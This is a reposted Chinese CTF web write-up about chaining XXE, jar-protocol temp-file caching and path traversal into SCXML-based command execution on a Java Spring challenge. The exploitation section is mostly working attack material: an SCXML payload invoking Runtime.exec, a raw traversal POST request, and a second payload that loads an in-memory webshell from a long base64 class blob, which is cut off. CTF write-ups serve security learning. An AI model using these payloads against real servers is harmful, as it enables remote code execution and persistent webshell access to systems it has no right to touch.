---
title: CTF-Web：xxe+jar协议缓存实现命令执行
url: https://buaq.net/go-156557.html
source: unSafe.sh - 不安全
date: 2023-04-03
fetch_date: 2025-10-04T11:29:44.395186
---

# CTF-Web：xxe+jar协议缓存实现命令执行

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/a7f23bdb4379e031254d018a58c52d3b.jpg)

CTF-Web：xxe+jar协议缓存实现命令执行

0x01 代码分析object方法object方法通过@RequestParam注解获取object参数，然后根据该参数拼接出一个文件路径file:///home + ob
*2023-4-2 17:12:36
Author: [1oecho.github.io(查看原文)](/jump-156557.htm)
阅读量:168
收藏*

---

## 0x01 代码分析

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716571.png)

**object方法**

object方法通过@RequestParam注解获取object参数，然后根据该参数拼接出一个文件路径file:///home + object。接着调用check方法检查该文件是否存在 `<script>` 标签，如果存在则返回 X E , X E , XX E;

**check方法**

该方法用于检查文件中是否存在`<script>`标签。

首先通过DocumentBuilderFactory.newInstance()创建一个DocumentBuilderFactory实例，然后通过newDocumentBuilder()方法创建一个DocumentBuilder实例。

接着使用builder.parse(fileName)方法将文件解析为一个Document对象，最后通过getElementsByTagName("script")方法获取所有`<script>`标签元素并检查其数量，如果为0，则返回`true`，否则返回`false`。

**xxe方法**

xxe方法通过`@RequestParam`注解获取uri参数，然后使用`DocumentBuilder`将该参数解析为一个`Document`对象。接着遍历该`Document`对象的所有子节点，并将其文本内容连接起来返回。由于没有对解析出来的文本进行任何过滤或验证，因此存在XXE漏洞。

## 0x02 漏洞利用

* object方法中存在SCXML解析漏洞，攻击者可以通过object参数构造一个包含恶意SCXML状态机的文件，从而在服务器上执行任意代码。
* xxe方法中存在XXE漏洞，攻击者可以通过uri参数构造一个恶意XML文件，从而读取服务器上的任意文件。

通过xxe读取根目录，发现readflag，也可以列目录获取缓存文件地址：

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716808.png)

通过jar协议缓存文件特点，通过工具使文件解压后不删除，通过xxe列目录获取tmp文件路径

https://github.com/pwntester/BlockingServer

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716324.png)

构造命令执行,通过`assign`绕过`script`标签过滤：

* Payload

```
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="state1">
    <state id="state1">
        <onentry>
            <assign location="command" expr="''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')" />
        </onentry>
    </state>
</scxml>
```

* 目录穿越指定缓存文件

```
POST /object HTTP/1.1
Host: 192.168.2.42:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

object=../../../../../../../../../../private/var/folders/86/8qfmjpl965j4x4ykyk1sfkf80000gn/T/jar_cache12949212024815436877.tmp
```

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716316.png)

* 通过el表达式，注入内存马：

```
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="state1">
  <state id="state1">
    <onentry>
      <assign location="command" expr="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(\'Injext\').newInstance();}catch (e){var clsString = classLoader.loadClass(\'java.lang.String\');var bytecodeBase64 = \'yv66vgAAADQArgoADQBcCABdCABeCgAGAF8IADUHAGAHAGEKAAYAYgcAYwgAZAcAZQoAZgBnBwBoCgBpAGoHAGsKAA8AbAoAZgBtBwBuCABvCwASAHAHAHEHAHIIAHMIAEUKAAYAdAoAdQBnCgB1AHYHAHcHAHgKAAYAeQoAHQB6CgB7AHwKAHsAfQcAfggAfwcAgAcASAkAgQCCCACDCgCBAIQKACIAhQoAHACGBwCHBwCIAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMSW5qZXh0OwEACDxjbGluaXQ+AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQACZTIBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbjsBABNSZXF1ZXN0Q29udGV4dFV0aWxzAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMAEAA2I2NAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAgAcAYAcAYwcAiQcAbgcAcgcAcQcAhwEAClNvdXJjZUZpbGUBAAtJbmpleHQuamF2YQwALQAuATMkeXY2NnZnQUFBRFFDRGdvQWxBRUlDQUVKQ1FDVEFRb0lBSmNKQUpNQkN3Y0JEQW9BQmdFSUNnQUdBUTBLQUFZQkRnb0Frd0VQQ1FDVEFSQUlBUkVLQUJNQkVnZ0JFd29BRXdFVUNnRVZBUllLQUJVQkZ3Z0JHQWNCR1FjQkdnY0JHd2NBcXdjQkhBZ0JIUW9BRXdFZUNBRWZDQUVnQ2dFaEFTSUtBQlFCSXdvQUZBRWtDZ0VoQVNVSEFTWUtBU0VCSndvQUlBRW9DZ0FnQVNrS0FCUUJLZ2dCS3dnQkxBZ0JMUWdCTGdnQkx3c0JNQUV4Q0FFeUNnQVVBVE1IQVRRSEFUVUlBTG9IQVRZSEFUY0lBTHdJQVRnSUFNQUtBQlFCT1FnQk9nb0JPd0U4Q2dBVUFUMElBVDRLQUJRQlB3Z0JRQWdCUVFnQlFnY0JRd29CUkFGRkNnRkVBVVlLQVVjQlNBb0FQZ0ZKQ0FGS0NnQStBVXNLQUQ0QlRBb0FNQUZOQ2dGT0FVOElBVkFMQVRBQlVRZ0JVZ29BRkFGVEJ3RlVDZ0JNQVFnS0FDMEJWUWdBNlFvQVRBRldDQURyQ0FEWUN3RXdBVmNLQVZnQldRZ0JXZ29BRXdGYkNnRmNBVjBLQVZ3QlhnY0JYd2dBelFjQllBb0FXd0ZoQ0FEUkJ3RmlDZ0JlQVdNTEFXUUJaUXNCWmdGbkN3Rm1BV2dIQVdvTEFHTUJhd2dCYkFnQmJRb0FGQUZ1Q3dCakFXOEhBWEFLQUdrQmNRZ0JjZ29BYVFGekNBRjBDd0YxQVhZSUFYY0tBWGdCZVFjQmVnb0FjUUY3Q2dGNEFYd0lBWDBJQVg0SkFYOEJnQW9BRXdHQkNnRVZBVjBIQVlJS0FIa0JDQW9BZVFHRENnRjRBWVFLQVlVQmhnb0JoUUdIQ2dGL0FZZ0tBQlVCVXdnQmlRc0JNQUdLQ2dDVEFZc0tBSk1CakFrQWt3R05Cd0dPQndHUENnQ0dBWkFIQVpFSEFaSUtBSW9CQ0FzQmt3Rk5DZ0FVQVpRS0FVNEJsUW9BRlFFT0NnQ0tBWllLQUpNQmx3b0FGQUdZQndHWkJ3R2FBUUFDZUdNQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3WVhOekFRQURiV1ExQVFBSGNHRjViRzloWkFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQURoTWVYTnZjMlZ5YVdGc0wzQmhlV3h2WVdSekwzUmxiWEJzWVhSbGN5OVRjSEpwYm1kSmJuUmxjbU5sY0hSdmNsUmxiWEJzWVhSbE93RUFER0poYzJVMk5FUmxZMjlrWlFFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka1pXTnZaR1Z5QVFBU1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUdZbUZ6WlRZMEFRQUJaUUVBRlV4cVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dU93RUFBbUp6QVFBRmRtRnNkV1VCQUFKYlFnRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFSb0hBUndCQUFwRmVHTmxjSFJwYjI1ekFRQW1LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFGdEFRQWRUR3BoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkRHNCQUFGekFRQURjbVYwQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQWx3Y21WSVlXNWtiR1VCQUdRb1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUTdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUtaMlYwVW1WeGRXVnpkQUVBR2t4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBTFoyVjBVbVZ6Y0c5dWMyVUJBQVJqYldSekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQm5KbGMzVnNkQUVBQTJOdFpBRUFCRzVsZUhRQkFBVkZiblJ5ZVFFQURFbHVibVZ5UTJ4aGMzTmxjd0VBRlV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNU93RUFDSEJoY21GdFMyVjVBUUFPY0dGeVlXMVdZV3gxWlV4cGMzUUJBQlZNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZERzQkFBVm1hV1ZzWkFFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBdHlaV0ZzVW1WeGRXVnpkQUVBSjB4dmNtY3ZZWEJoWTJobEwyTmhkR0ZzYVc1aEwyTnZibTVsWTNSdmNpOVNaWEYxWlhOME93RUFFbU52ZVc5MFpWSmxjWFZsYzNSR2FXVnNaQUVBRFdOdmVXOTBaVkpsY1hWbGMzUUJBQnRNYjNKbkwyRndZV05vWlM5amIzbHZkR1V2VW1WeGRXVnpkRHNCQUFwd1lYSmhiV1YwWlhKekFRQW9URzl5Wnk5aGNHRmphR1V2ZEc5dFkyRjBMM1YwYVd3dmFIUjBjQzlRWVhKaGJXVjBaWEp6T3dFQUQzQmhjbUZ0U0dGemFGWmhiSFZsY3dFQUNIQmhjbUZ0VFdGd0FRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd093RUFDR2wwWlhKaGRHOXlBUUFVVEdwaGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2pzQkFBdHdZV2RsUTI5dWRHVjRkQUVBRTB4cVlYWmhMM1YwYVd3dlNHRnphRT...